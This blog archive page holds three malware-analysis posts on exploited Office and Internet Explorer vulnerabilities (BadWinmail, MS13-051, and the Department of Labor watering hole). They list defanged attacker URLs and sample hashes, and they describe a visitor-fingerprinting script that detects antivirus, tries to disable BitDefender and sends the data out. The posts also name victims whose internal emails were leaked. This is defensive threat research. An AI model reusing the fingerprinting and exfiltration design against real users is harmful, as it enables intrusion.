=== Content from eromang.zataz.com_1b8be374_20250126_054644.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# Category Archives: Reverse Engineering

# [CVE-2015-6172 BadWinmail found exploited in the wild](https://eromang.zataz.com/2015/12/28/cve-2015-6172-badwinmail-found-exploited-in-the-wild/)

[28/12/2015](https://eromang.zataz.com/2015/12/28/cve-2015-6172-badwinmail-found-exploited-in-the-wild/ "Permalink to CVE-2015-6172 BadWinmail found exploited in the wild")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[BitDefender](https://eromang.zataz.com/tag/bitdefender/), [CVE-2015-6172](https://eromang.zataz.com/tag/cve-2015-6172/), [F-Secure](https://eromang.zataz.com/tag/f-secure/), [False Positive](https://eromang.zataz.com/tag/false-positive/), [Microsoft](https://eromang.zataz.com/tag/microsoft/), [MS15-131](https://eromang.zataz.com/tag/ms15-131/), [Office](https://eromang.zataz.com/tag/office/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

##### **Conclusion: It seem that AV vendors did a big mistake and blocked thousands of legit emails and by consequence also disclosed the content of certain of these emails on Internet, like DRP plan of banks…**

##### **All detected samples have now reduced they’re detection rate to only marginal anti-viruses. But clearly F-Secure and BitDefender were detecting and blocking thousands of emails during the last days. For the moment, we have no explanation from the anti-virus vendors.**

##### **I would like to thanks [@\_clem1](https://twitter.com/_clem1), [@Kafeine](https://twitter.com/kafeine) and [@PhysicalDrive0](https://twitter.com/PhysicalDrive0) for they’re support in these clarifications.**

On December 8th 2015, Microsoft released, during his regular [Patch Tuesday](https://eromang.zataz.com/2015/12/09/microsoft-december-2015-patch-tuesday-review/), two updated security advisory, one new security advisory and twelve security bulletins. On the twelve security bulletins, **MS15-131** concerned Microsoft Office and fixed 6 privately reported vulnerabilities.

One of the 6 vulnerabilities fixed in **MS15-131**, **CVE-2015-6172** vulnerability [raised particular attention](http://arstechnica.com/security/2015/12/outlook-letterbomb-exploit-could-auto-open-attacks-in-e-mail/) of the security community. This vulnerability, named Outlook “*letterbomb*” or “*BadWinMail*“, would allow an attacker to sneak past Outlook’s security features. The vulnerability affects Office 2010 and later, as well as Microsoft Word 2007 with Service Pack 3.

This vulnerability has been discovered and privately reported to Microsoft by **Haifei Li** of Intel Security IPS Research Team. The security researcher published [a paper](https://sites.google.com/site/zerodayresearch/BadWinmail.pdf) describing the vulnerability accompanied by a demonstration video.

Unfortunately it seem that this vulnerability is actually exploited and was exploited before the release of Microsoft security patch.

Two files “*FW Joseph J. Durczynski.rtf*” ([957a8d9d6bf7a0e54ad7eb350c930232](https://www.virustotal.com/en/file/575241b587871331cf04e0f2bac2141ce493ca114a6c62951eb8eb6f0c1a21f1/analysis/)) and “*FW Philip Services Corp. et al..rtf*” ([20e184a415cd71eee1cea83df262f814](https://www.virustotal.com/en/file/59b068bff97d4042c6741c6c14cc206a87291d095f8b5380e4fdf3ea75202a3d/analysis/)) were submitted to VirusTotal the 27 December and detected as exploit of CVE-2015-6172.

“*FW Philip Services Corp. et al..rtf*” file seems to be related to [PSC Industrial Services](http://pscnow.com). PSC claim to be the leading provider of specialty maintenance services and technology solutions to the critical energy infrastructure in the United States.

“*FW Joseph J. Durczynski.rtf*” file seems to be related to [Systech Environmental Corp](http://go2systech.com) and to particularly a certain [Joe Durczynski](http://go2systech.com/locations/paulding-ohio/) working for Systech Environmental Corp.

By doing additional researches I found a third sample “*\_WRF\_0CE7DC0E-AB99-4196-8DC2-F818ABF7C29A\_.tmp*” ([52c4096e99126851736715c34b1f50a5](https://malwr.com/analysis/NjRiOTAwNDI3NmI3NGNiNGJkODQwOTA1N2U5OWVkMjU/)) submitted on malwr the 23 December. This sample was [also submitted](https://www.virustotal.com/en/file/db809fb83661586940813c00df7974cdeaa9f499961f859adb64360ad6798df9/analysis/) on VirusTotal the 23 December and also recognised as exploit of CVE-2015-6172.

One additional file “[FW RFQ.rtf](https://malwr.com/analysis/NDVlZDdhZTM3MDhjNDIxOTk2NmQ4ZTU2NmQzNDgwODk/)” ([fab9cfbc629fb3c3eb541fdaf8169ee1](https://www.virustotal.com/en/file/588976379922cde55a06eecfa195cf8ff182193308c1a34ca8c16f15a41cb537/analysis/)), reported to me by **[@PhysicalDrive0](https://twitter.com/PhysicalDrive0),** targeting [PGM Corp](http://www.pgmcorp.com/). PGM is a full service precision manufacturing corporation specialising in precision CNC machining, turning, grinding and assembly.

[![7328bf73af839bfc05e5cae177d60ca06cddc52beeee51fb2268f9a8b98d24fa](https://eromang.zataz.com/wp-content/uploads/7328bf73af839bfc05e5cae177d60ca06cddc52beeee51fb2268f9a8b98d24fa.jpg)](https://eromang.zataz.com/wp-content/uploads/7328bf73af839bfc05e5cae177d60ca06cddc52beeee51fb2268f9a8b98d24fa.jpg)

Interesting informations are the strings in the static analysis of the 23th December malwr sample.

Subject of the email was “*FW: Disaster Recovery – home binder*” and this email is an internal mail exchange of [**Safe Credit Union**](https://www.safecu.org/) organisation. Also the mail containing the malware was sent the Tuesday, **8th September 2015**.

It seem to be quiet urgent to patch if you didn’t already did it, but that seem to be more and more sure is that CVE-2015-6172 was used in the wild before the release of the Microsoft December patch.

Additional samples are actually submitted:

* “KOMPETANCEUDVIKLING mail til området.rtf” ([151ef7c2c675b925e67e34a10fcd6f4a](https://www.virustotal.com/en/file/25021e47a9cfc4e35b70a8bdf4075e3a506db319631a912d6a9347ad7dd8b4ae/analysis/))
* “060320 Varsel om krav fra K401 SF-HJ.rtf” ([5f350c6f062c7c2117d3da6b108566e7](https://www.virustotal.com/en/file/e0527d09ba4bb253131f3f6fa7b18193074a46c9f2c50d352995ae21245bbcca/analysis/))

# [MS13-051 / CVE-2013-1331 What We Know About Microsoft Office Zero Day](https://eromang.zataz.com/2013/06/13/ms13-051-cve-2013-1331-what-we-know-about-microsoft-office-zero-day/)

[13/06/2013](https://eromang.zataz.com/2013/06/13/ms13-051-cve-2013-1331-what-we-know-about-microsoft-office-zero-day/ "Permalink to MS13-051 / CVE-2013-1331 What We Know About Microsoft Office Zero Day")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[APT](https://eromang.zataz.com/tag/apt/), [CVE-2013-1331](https://eromang.zataz.com/tag/cve-2013-1331/), [Microsoft](https://eromang.zataz.com/tag/microsoft/), [MS13-051](https://eromang.zataz.com/tag/ms13-051/), [Office](https://eromang.zataz.com/tag/office/), [Office 0day](https://eromang.zataz.com/tag/office-0day/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

**[MS13-051](https://eromang.zataz.com/2013/06/12/microsoft-june-2013-patch-tuesday-review/ "Microsoft June 2013 Patch Tuesday Review") Microsoft Office** bulletin was release Tuesday 11th 2013 during the traditional Patch Tuesday. This bulletin fix one vulnerability,  **CVE-2013-1331**, with a base CVSS score of **9.3** and targeting Microsoft Office 2003 and Office for Mac (2011). This vulnerability allow  remote code execution and was reported by Andrew Lyons and Neel Mehta of Google Inc.

Microsoft has also release [additional information’s](http://blogs.technet.com/b/srd/archive/2013/06/11/ms13-051-get-out-of-my-office.aspx) and it appears that some “*bad guys*” were using this vulnerability as a zero-day in targeted attacks. The vulnerability is related on how Microsoft Office render malformed PNG files leading to a classic stack based buffer overflow.

Malicious Office documents were referencing a malicious PNG file loaded from Internet and hosted on a remote servers. Remote servers were using scripts in order to avoid multiple times exploitation from the same source. Microsoft believe that attacks were limited to Indonesia and Malaysia.

Microsoft provided some examples of URLs invoked by the malicious Office document, and some hashes of the malicious Office binary format documents.

* hXXp://intent.nofrillspace.com/users/web11\_focus/4307/space.gif
* hXXp://intent.nofrillspace.com/users/web11\_focus/3807/space.gif
* hXXp://mister.nofrillspace.com/users/web8\_dice/3791/space.gif
* hXXp://mister.nofrillspace.com/users/web8\_dice/4226/space.gif
* hXXp://www.bridginglinks.com/somebody/4698/space.gif
* hXXp://www.police28122011.0fees.net/pages/013/space.gif
* hXXp://zhongguoren.hostoi.com/news/space.gif

##### Information Gathering on “*intent.nofrillspace.com*“

By doing some researches we can find a Google cached Excel document mentioning this domain name the 2011-12-29. Domain name is mentioned as a gateway for malicious activities. Actually the web site is down, but associated IP was 80.93.50.73, hosted in the Russian Federation.

“*No Frill Space*” is a hosting company offering free web spaces. The company web site was still up, regarding WayBack Machine, the May 28th 2013. No additional information’s are available.

[![intent.nofrillspace.com-document](https://eromang.zataz.com/wp-content/uploads/intent.nofrillspace.com-document-300x13.png)](https://eromang.zataz.com/wp-content/uploads/intent.nofrillspace.com-document.png)

##### Information Gathering on “*mister.nofrillspace.com*“

By doing some researches we can find a Google cached web page as it appeared on 27 May 2013. Since, like the previous domain, the web site is no more available. No additional information’s are available.

[![mister-nofrillspace-com-webpage](https://eromang.zataz.com/wp-content/uploads/mister-nofrillspace-com-webpage-300x82.png)](https://eromang.zataz.com/wp-content/uploads/mister-nofrillspace-com-webpage.png)

##### Information Gathering on “*www.bridginglinks.com*“

Like “*No Frill Space*“, “*BRIDGING LINKS*” is a hosting company offering free web spaces. The company web site was still up, regarding WayBack Machine, the May 21th 2013. “*www.bridginglinks.com*” was hosted on 85.17.143.51 located in Netherlands.

If we take a look on [**urlQuery**](http://urlquery.net/report.php?id=1808318), we can see a submission dating of April 4th 2013, mentioning an interesting URL “*hXXp://www.bridginglinks.com/somebody/4698/vw.php*“. As you can see the path is the same as the path mentioned by Microsoft. “*vw.php*” could be one of the file used to avoid multiple times exploitation.

**Joe Sandbox** is also referencing [Report 1482](http://joedd.joesecurity.org/index.php/analysis/930), no more available, that refer a URL “*hXXp://www.bridginglinks.com/somebody/4688/vw.php?i=b95146-8a76c6cb7d84148d95ab5a4921b3839c*” and a name of a Word document “*virus\_suspected.doc*“. Associated MD5 of the document is “*714876fdce62371da08c139377f23d76*“, was submitted March 3th 2013, with a file size of 113.0 KB.

![my-sample](https://eromang.zataz.com/wp-content/uploads/my-sample-300x34.png)

With the MD5 we can found a [**VirusTotal**](https://www.virustotal.com/en/file/f854f057c5b7e5e9f863d94d0c81c1f8a2f1eac34dae900da52f6cadf98d923a/analysis/) sample. Creation date of this document was February 25th 2013. Title of the document is “*VN h?c gì t? v? Philippines ki?n TQ*” that seem to be Vietnamese and could be translated to “*VN learn from China’s conditions for Philippines*“.

Document title seem to be related to the events of beginning of this year between China and Philippines regarding territory conflicts.

Here under a screenshot of the sample

[![CVE-2013-1331-sample](https://eromang.zataz.com/wp-content/uploads/CVE-2013-1331-sample.png)](https://eromang.zataz.com/wp-content/uploads/CVE-2013-1331-sample.png)

[@mwtracker](http://blog.malwaretracker.com/2013/06/ms13-051-cve-2013-1331-office-zero-day.html?spref=tw) also submitted a sample on [**Cryptam**](https://www.malwaretracker.com/docsearch.php?hash=714876fdce62371da08c139377f23d76) June 13th 2013.

##### Update of June 16th 2013

After doing some further investigations we noticed another Word sample ([f85eaad502e51eafeae0430e56899d9b](https://www.virustotal.com/en/file/050c540cea76ea7e584d71c2c429179b73c5667dc5b8bd20480d66704c58495c/analysis/)) submitted to VirusTotal October 28th 2009 and that has a creation date of October 26th 2009. A re-submission of this sample clearly detect CVE-2013-1331 !

By analyzing this sample title of the document is “*The corruption of Mahathir*” from autor “*585*“. “*The corruption of Mahathir*” document is a reference to [Mahathir Mohamad](https://en.wikipedia.org/wiki/Mahathir_Mohamad) a Malaysian politician who was the fourth Prime Minister of Malaysia, and the document is an adaptation of a Bangkok Post article to remind people how the country has been damaged by Dr M, UMNO and his cronies.

[![The-corruption-of-Mahathir](https://eromang.zataz.com/wp-content/uploads/The-corruption-of-Mahathir.png)](https://eromang.zataz.com/wp-content/uploads/The-corruption-of-Mahathir.png)

Like the previous sample, this sample is referencing “*www.bridginglinks.com*” and has exactly the same patterns.

[![space-gif-2](https://eromang.zataz.com/wp-content/uploads/space-gif-2.png)](https://eromang.zataz.com/wp-content/uploads/space-gif-2.png)

##### Update of June 17th 2013

Microsoft has [reference](http://blogs.technet.com/b/srd/archive/2013/06/11/ms13-051-get-out-of-my-office.aspx) some hashes of the malicious Office documents. Here under more detailled information’s on these documents. All these malicious documents are actually only detected by [**Avast**](http://www.avast.com/index) and **Symantec**.

**[35a6bbc6dda6a1b3a1679f166be11154](https://www.virustotal.com/en/file/0c7567a989b38862085faeb3629cb472e48b65d635a4fb6ccb1c26adeb0726ac/analysis/) Office document**

Document theme is related to telecommunications and has “*Telco – XX??2013??????????*” as title, that could be translated to “*Telco – XX company in 2013 described the core network building program*“. The document was created Wednesday March 6th 2013 and last saved by “*abc*“. The document initiate connexions to “*hXXp://zhongguoren.hostoi.com/news/space.gif*“.

[![zhongguoren-office-doc](https://eromang.zataz.com/wp-content/uploads/zhongguoren-office-doc2.png)](https://eromang.zataz.com/wp-content/uploads/zhongguoren-office-doc2.png)

[![zhongguoren-link](https://eromang.zataz.com/wp-content/uploads/zhongguoren-link.png)](https://eromang.zataz.com/wp-content/uploads/zhongguoren-link.png)

**fde37e60cc4be73dada0fb1ad3d5f273 Office document**

Document theme is related to [**Susilo Bambang Yudhoyono**](https://en.wikipedia.org/wiki/Susilo_Bambang_Yudhoyono) an Indonesian politician and retired Army general officer who has been President of Indonesia since 2004. Document title is “*Macam-macam critis terhadap SBY dan gerakan kabinet di situs Gerakan Anti SBY II*” that could be translated to “*Various critis against SBY cabinet and movement at the site of the anti SBY II*“. The document was created Monday October 31th 2011 and last saved by “*xmuser*“. The document initiate connexions to “*hXXp://mister.nofrillspace.com/users/web8\_dice/4226/space.gif*“.

[![mister-office-doc](https://eromang.zataz.com/wp-content/uploads/mister-office-doc.png)](https://eromang.zataz.com/wp-content/uploads/mister-office-doc.png)

[![mister-link](https://eromang.zataz.com/wp-content/uploads/mister-link.png)](https://eromang.zataz.com/wp-content/uploads/mister-link.png)

**2f1ab543b38a7ad61d5dbd72eb0524c4 Office document**

Document theme is related to Chinese zodiac previsions for 2011, and document title is “*Forecast for 2011*“. The document was created Monday February 7th 2011 and last saved by “*xmuser*“. The document initiate connexions to “*hXXp://intent.nofrillspace.com/users/web11\_focus/3807/space.gif*“.

[![intent-office-doc](https://eromang.zataz.com/wp-content/uploads/intent-office-doc.png)](https://eromang.zataz.com/wp-content/uploads/intent-office-doc.png)

[![intent-link](https://eromang.zataz.com/wp-content/uploads/intent-link.png)](https://eromang.zataz.com/wp-content/uploads/intent-link.png)

**[28e81ca00146165385c8916bf0a61046](https://www.virustotal.com/en/file/66a85a846c816821635337b61da6bff58cbb5d4a8dc5a87b05f08d4a9e934372/analysis/) Office document**

Document theme is Malaysian Telco. The document was created by “*PDRM*” and last saved by “*abc*“, also creation date of the document is Sunday October 14th 2012. The document initiate connexions to “*hXXp://www.police28122011.0fees.net/pages/013/space.gif*“.

[![police28122011-office-doc](https://eromang.zataz.com/wp-content/uploads/police28122011-office-doc.png)](https://eromang.zataz.com/wp-content/uploads/police28122011-office-doc.png)

[![police28122011-link](https://eromang.zataz.com/wp-content/uploads/police28122011-link.png)](https://eromang.zataz.com/wp-content/uploads/police28122011-link.png)

**7eb17991ed13960d57ed75c01f6f7fd5 Office document**

Document theme is Indoleaks, an Indonesian equivalent of Wikileak, and document title is “*Indoleaks, ‘Wikileaksnya’ Indonesia*“. The document was created by “*3565*“, last saved by “*xmuser*” and created Sunday January 23th 2011. The document initiate connexions to “*hXXp://mister.nofrillspace.com/users/web8\_dice/3791/space.gif*“.

[![mister-office-doc2](https://eromang.zataz.com/wp-content/uploads/mister-office-doc2.png)](https://eromang.zataz.com/wp-content/uploads/mister-office-doc2.png)

[![mister-link2](https://eromang.zataz.com/wp-content/uploads/mister-link2.png)](https://eromang.zataz.com/wp-content/uploads/mister-link2.png)

**70511e6e75aa38a4d92cd134caba16ef Office document**

Document theme is surveillance devices with document title “*Top 11 Aerial Surveillance Devices*“. The document was last saved by “*xmuser*” and created Tuesday January 3th 2012. The document initiate connexions to “*hXXp://intent.nofrillspace.com/users/web11\_focus/4307/space.gif*”

[![intent-office-doc2](https://eromang.zataz.com/wp-content/uploads/intent-office-doc2.png)](https://eromang.zataz.com/wp-content/uploads/intent-office-doc2.png)

[![intent-link2](https://eromang.zataz.com/wp-content/uploads/intent-link2.png)](https://eromang.zataz.com/wp-content/uploads/intent-link2.png)

##### Conclusions

Here under a recap table of all behaviors

| MD5 | Author | Last Saved By | Creation Date | Last Saved Date | Domain | Params |
| --- | --- | --- | --- | --- | --- | --- |
| 714876fdce62371da08c139377f23d76 | SYSTEM | SYSTEM | 2013-02-24 | 2013-02-24 | www.bridginglinks.com | 95146-555210c567278074917c1d11f25a6221 |
| f85eaad502e51eafeae0430e56899d9b | 585 | - | 2009-11-26 | 2009-11-26 | www.bridginglinks.com | 41977-9c477a3c3bf9724fbd985772f6c50ef0 |
| 35a6bbc6dda6a1b3a1679f166be11154 | User | abc | 2013-03-06 | 2013-03-06 | zhongguoren.hostoi.com | 2064-ccca749e1a0e6806503c83048bb643d3 |
| fde37e60cc4be73dada0fb1ad3d5f273 | - | xmuser | 2011-10-31 | 2011-10-31 | mister.nofrillspace.com | 81425-3b068ea3d53786a94aaa715c7692a0a1 |
| 2f1ab543b38a7ad61d5dbd72eb0524c4 | - | xmuser | 2011-02-07 | 2011-02-07 | intent.nofrillspace.com | 67575-80f27a85a4383ea2f92e8ba46c728ba3 |
| 28e81ca00146165385c8916bf0a61046 | PDRM | abc | 2012-10-14 | 2012-10-14 | www.police28122011.0fees.net | 013-8354f8a7f3c21f58d7dbfa2a943c88b8 |
| 7eb17991ed13960d57ed75c01f6f7fd5 | 3565 | xmuser | 2011-01-23 | 2011-01-23 | mister.nofrillspace.com | 66995-83fcb7c8e552c81da5611e93a856a399 |
| 70511e6e75aa38a4d92cd134caba16ef | - | xmuser | 2012-01-03 | 2012-01-03 | intent.nofrillspace.com | 84435-81782ff9e4e204717db82d2e43a76f2d |

My personal opinion is that:

* I can clearly confirm that the zero-day was exploited in the wild since minimum ~~February 2013~~ October 2009
* the campaign was active since a while and has surely target other victims than previously thought.

I will keep you in touch with additional information’s.

# [Department of Labor Watering Hole Campaign Review](https://eromang.zataz.com/2013/05/10/department-of-labor-watering-hole-campaign-review/)

[10/05/2013](https://eromang.zataz.com/2013/05/10/department-of-labor-watering-hole-campaign-review/ "Permalink to Department of Labor Watering Hole Campaign Review")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[APSA13-03](https://eromang.zataz.com/tag/apsa13-03/), [APT](https://eromang.zataz.com/tag/apt/), [CFR](https://eromang.zataz.com/tag/cfr/), [CVE-2012-4792](https://eromang.zataz.com/tag/cve-2012-4792/), [CVE-2013-1347](https://eromang.zataz.com/tag/cve-2013-1347/), [CVE-2013-3336](https://eromang.zataz.com/tag/cve-2013-3336/), [Department of Labor](https://eromang.zataz.com/tag/department-of-labor/), [DOL](https://eromang.zataz.com/tag/dol/), [Internet Explorer](https://eromang.zataz.com/tag/internet-explorer/), [Internet Explorer 0day](https://eromang.zataz.com/tag/internet-explorer-0day/), [Microsoft](https://eromang.zataz.com/tag/microsoft/), [MSA-2847140](https://eromang.zataz.com/tag/msa-2847140/), [watering hole attacks](https://eromang.zataz.com/tag/watering-hole-attacks/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

On April 30th, the watering hole campaign was published on a private mailing list and the May 1st, [**Invicia**](http://www.invincea.com/2013/05/part-2-us-dept-labor-watering-hole-pushing-poison-ivy-via-ie8-zero-day/) and [**AlienVault**](http://labs.alienvault.com/labs/index.php/2013/u-s-department-of-labor-website-hacked-and-redirecting-to-malicious-code/) publicly reported, with technical details, that **United States Department of Labor (DOL) Site Exposure Matrices (SEM)** website had been compromised and was hosting malicious code. This malicious code was used in watering hole attack targeting at first employees of US Dept of Energy that work in nuclear weapons programs. This malicious code was also used to gather information’s on the visitors of the compromised website.

The exploit used in this campaign was firstly reported as **[CVE-2012-4792](https://eromang.zataz.com/2012/12/30/microsoft-internet-explorer-cdwnbindinfo-vulnerability-metasploit-demo/ "Microsoft Internet Explorer CButton Vulnerability Metasploit Demo")**, an Internet Explorer 0day used in December 2012 in [CFR.org watering hole campaign](https://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/ "Attack and IE 0day Informations Used Against Council on Foreign Relations") and [patched by Microsoft in January 2013](https://eromang.zataz.com/2013/01/14/microsoft-out-of-band-patch-for-internet-explorer-cve-2012-4792-vulnerability/ "Microsoft Out-Of-Band Patch for Internet Explorer CVE-2012-4792 Vulnerability"). Despite the patch release some forks of this exploit were still used in targeted attacks against political parties, political dissidents, online medias and human right activists.

Two days later, [**FireEye**](http://www.fireeye.com/blog/technical/cyber-exploits/2013/05/ie-zero-day-is-used-in-dol-watering-hole-attack.html), [**Invicia**](http://www.invincea.com/2013/05/k-i-a-us-dol-website-pushing-poison-ivy-cve-2012-4792/) and [**AlienVault**](http://labs.alienvault.com/labs/index.php/2013/new-internet-explorer-zeroday-was-used-in-the-dol-watering-hole-campaign/) concluded that the vulnerability targeted during this attack campaign was not CVE-2012-4792 as they originally reported but a new Internet Explorer 8 vulnerability identified as [**CVE-2013-1347**](https://eromang.zataz.com/2013/05/05/cve-2013-1347-microsoft-internet-explorer-8-vulnerability-metasploit-demo/ "CVE-2013-1347 Microsoft Internet Explorer 8 Vulnerability Metasploit Demo"). This turnaround had unfortunately occur to late. Casual attacker, chaotic actors, organized crime and potentially other states involved in sponsored espionage had the opportunity to study the attack and recover the evidences.

Microsoft has acknowledge the vulnerability in a Microsoft Security Advisory published on May 3rd and identified as **[MSA-2847140](http://technet.microsoft.com/en-us/security/advisory/2847140)**and has provide a “[**Fix it**](http://blogs.technet.com/b/srd/archive/2013/05/08/microsoft-quot-fix-it-quot-available-to-mitigate-internet-explorer-8-vulnerability.aspx)” solution to mitigate Internet Explorer 8 vulnerability.

Also, Adobe has announce through [**APSA13-03**](http://www.adobe.com/support/security/advisories/apsa13-03.html) that a critical vulnerability (**CVE-2013-3336**) is actually exploited against ColdFusion. This vulnerability could permit an unauthorized user to remotely retrieve files stored on the server, through “*CFIDE/administrator*“, “*CFIDE/adminapi*” and “*CFIDE/gettingstarted\**” directories. Adobe ColdFusion is used by DOL and this vulnerability has surely be used in order to compromise the server.

##### Possible Causes of Confusion between CVE-2012-4792 and CVE-2013-1347

Confusions with CVE-2012-4792 was possible due to similarities in used code and technics:

***Usage of widely used JavaScript functions and variables***

“*function getCookieVal(offset)*“, widely used, is also present in original CVE-2012-4792 exploit and other forks.

“*function GetCookie(name)*“, widely used,  is also present in original CVE-2012-4792 exploit and other forks.

“*function SetCookie(name,value)*“, widely used, is also present in original CVE-2012-4792 exploit and other forks.

“*var ua = window.navigator.userAgent.toLowerCase()*“, widely used, is also present in original CVE-2012-4792 exploit and other forks.

***Usage of particular JavaScript functions also present in previous watering hole campaigns***

“*function DisplayInfo()*” also seen in CVE-2012-4792 & [CVE-2011-0611](https://eromang.zataz.com/2011/04/16/cve-2011-0611-adobe-flash-player-swf-memory-corruption-vulnerability/ "CVE-2011-0611 : Adobe Flash Player SWF Memory Corruption Vulnerability") exploits.

“*function download()*” & “*function callback()*” also seen in CVE-2012-4792 exploit.

***Usage of Ajax XMLHttpRequest***

This JavaScript object is used to download “*bookmark.png*” file and was also used to download  “*xsainfo.jpg*” file in CVE-2012-4792.

***Similarities in the JavaScript code structure***

If you compare the original CVE-2012-4792 JavaScript code and **Exodus Intel** fork, with this new exploit, the code structure is very similar in many aspects.

***Usage of HTML+TIME technic***

HTML+TIME, which is based on the Synchronized Multimedia Integration Language (SMIL), was also used in certain CVE-2012-4792. This technic was explained by [**Exodus Intel**](http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/%20) beginning January 2013.

***Target selection***

Parts of the code targets only Windows XP, Internet Explorer 8 and certain languages, like CVE-2012-4792.

##### Differences between CVE-2012-4792 and CVE-2013-1347, and Particularities

Some new particularities were present in the exploit and associated watering hole campaign:

***Usage of PHP files***

All previous watering hole attacks have use HTML or JavaScript files. PHP usage naturally limit the number of potential servers who could be used to start the exploitation and spread the malware. This approach increasingly the technic used by Exploit Kits, maybe a source of inspiration and effectiveness for states involved in sponsored espionage.

***Usage of Base64 obfuscation***

Obfuscation with base64 encoding (“*base64.js*” file) was used to hide parts of the exploit. CVE-2012-4792 was using “*robots.txt*” obfuscated with substitutions and HEX encoding.

***Use-After-Free type***

As mentioned by [**sinn3r**](https://community.rapid7.com/community/metasploit/blog) of Metasploit team, CVE-2012-4792 was a CButton object use-after-free and CVE-2013-1347 is a CGenericElement object use-after-free.

##### dol[.]ns01[.]us Exploit Hosting Domain Evolutions

**Invicia** and **AlienVault**have report that the browser was redirected to the content hosted at dol[.]ns01[.]us which lead to the infection. A **urlQuery**, of [**2013-05-01**](http://urlquery.net/report.php?id=2259188),is mentioned and refer to dol[.]ns01[.]us on port 8081/TCP. One hit related to the information gathering script is mentioning a last modified date of Thu, 14 Mar 2013 20:06:36 GMT. You can also observe in the executed JavaScript that the hxxp://dol[.]ns01[.]us:8081/web/js.php and hxxp://dol[.]ns01[.]us:8081/web/css.js URL’s are present in the code.

[![96.44.136.115-3](https://eromang.zataz.com/wp-content/uploads/96.44.136.115-3.gif)](https://eromang.zataz.com/wp-content/uploads/96.44.136.115-3.gif)

But if you take a look to a previous urlQuery report of **[2013-04-29](http://urlquery.net/report.php?id=2223322)**, hxxp://96[.]44[.]136[.]115/web/js.php, hxxp://96[.]44[.]136[.]115/web/css.js and hxxp:///web/xss.php are mentioned and coded in the executed JavaScript. 96[.]44[.]136[.]115 IP address is mentioned by AlienVault as the IP address behind dol[.]ns01[.]us. As you can see no specific destination port is present and the last modified date is the same. So we can conclude that the guys behind this campaign have change the malicious code during this interval.

[![urlquery-dol-1](https://eromang.zataz.com/wp-content/uploads/urlquery-dol-1.gif)](https://eromang.zataz.com/wp-content/uploads/urlquery-dol-1.gif)

You can observe this evolution with the urlQuery submission of **[2013-04-30](http://urlquery.net/report.php?id=2232889)**.

[![urlquery-2](https://eromang.zataz.com/wp-content/uploads/urlquery-2.gif)](https://eromang.zataz.com/wp-content/uploads/urlquery-2.gif)

All these urlQuery submission’s were done with a non Internet Explorer 8 user agent, and as the exploit malicious code was designed to only target Windows XP and Internet Explorer 8, part of the redirection were not present as evidences.

If you observe “[*/scripts/textsize.js*](http://pastebin.com/7yYd6Dzt)” JavaScript code hosted on DOL website, you can see a first JavaScript inclusion to “*hxxp://dol[.]ns01[.]us:8081/web/xss.php*” and a second one to “*hxxp://dol[.]ns01[.]us:8081/update/index.php*“.

The first inclusion “[*/web/xss.php*](http://pastebin.com/nk74nzRJ)” was used in order to gather information’s on the DOL website visitors and the second inclusion “[*/update/index.php*](http://pastebin.com/vkQAgnUV)” was used to start the exploitation of CVE-2013-1347.

##### Information Gathering Scripts

As described by [**AlienVault**](http://labs.alienvault.com/labs/index.php/2013/u-s-department-of-labor-website-hacked-and-redirecting-to-malicious-code/), the information gathering code “*/web/xss.php*” on *dol[.]ns01[.]us*use different JavaScript functions to collect information’s from the system and upload the result to the malicious server.

I found that the information’s gathering script was different depending on the used browser. Here under a description of the JavaScript functions involved in information’s gathering depending on used browsers.

## DOL Information Gathering Functions

| JavaScript Function(s) | Targeted Browser(s) | Function Description |
| --- | --- | --- |
| jstocreate() | Internet Explorer | Test the presence of the Avira, Bitdefender 2013, McAfee VirusScan Enterprise, AVG Secure Search, ESET NOD32, Dr.Web, Microsoft Security Essentials, Sophos, F-Secure Antivirus 2011, Kaspersky 2012, Kaspersky 2013 anti-viruses. |
| flashver() | Internet Explorer & Firefox & Chrome | Test the presence and version of Adobe Flash, and supported OS. |
| officever() | Internet Explorer | Test the presence and version of Microsoft Office |
| plugin\_pdf\_ie() | Internet Explorer | Test the presence of Adobe Reader |
| bitdefender2012check() | Internet Explorer & Firefox & Chrome | Test the presence of BitDefender 2012 and try to disable it through disabledbitdefender\_2012() function. |
| java() | Internet Explorer & Firefox & Chrome | Test the presence and version of Oracle Java plug-in |
| xunleicheck() | Firefox & Chrome | Test the presence of xThunder Chrome extension, an extension managing popular downloaders. |
| kavcheck() | Firefox & Chrome | Test the presence of Kaspersky Chrome extension |
| fiddlercheck() | Firefox & Chrome | Test the presence of Fiddler Chrome extension. Fiddler is an HTTP debugging proxy server application |
| liveheadercheck() | Firefox & Chrome | Test the presence of Live HTTP Header Chrome extension |
| webdevelopercheck() | Firefox & Chrome | Test the presence of Web Developer Chrome extension |
| avg2012check() | Firefox & Chrome | Test the presence of AVG 2012 Chrome extension |
| tamperdatacheck() | Firefox & Chrome | Test the presence of Tamper data Chrome extension |
| adblockcheck() | Firefox & Chrome | Test the presence of Adblocker Chrome extension |
| avastcheck() | Firefox & Chrome | Test the presence of Avast! Chrome extention |
| pluginverother() | Firefox & Chrome | Test the presence of all installed modules |

All functions used by the information gathering script involved in the DOL watering hole campaign.

Also a specific information gathering technic was triggered when Internet Explorer was used. This technic is related to a [non patched vulnerability](http://www.nsfocus.com/en/2012/advisories_1228/119.html) in Internet Explorer 8, discovered by NSFOCUS and reported to Microsoft in 2011. The vulnerability could allow user information and even local file content leakage if a user views a specially crafted webpage using Internet Explorer.

[![SA2012-02](https://eromang.zataz.com/wp-content/uploads/SA2012-02.png)](https://eromang.zataz.com/wp-content/uploads/SA2012-02.png)

Once all information’s gathered, the script send all data’s on a specific URL “*hxxp://dol[.]ns01[.]us:8081/web/js.php*” and also call “*hxxp://dol[.]ns01[.]us:8081/web/css.js*” when the information’s are collected.

[![infogath-inclusions](https://eromang.zataz.com/wp-content/uploads/infogath-inclusions.png)](https://eromang.zataz.com/wp-content/uploads/infogath-inclusions.png)

